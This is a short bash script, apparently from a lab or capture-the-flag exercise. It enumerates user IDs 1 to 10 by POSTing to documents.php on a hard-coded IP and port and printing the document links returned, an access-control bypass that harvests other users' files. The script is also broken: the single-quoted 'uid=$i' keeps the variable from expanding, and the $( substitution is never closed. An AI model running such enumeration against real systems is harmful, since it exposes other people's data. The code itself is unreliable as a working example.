#!/bin/bash

url="http://64.227.39.88:31815"

for i in {1..10}; do
        for link in $(curl -i -s -k -X POST -d 'uid=$i' "$url/documents.php?"; do
                echo ${url}${link}
        done
done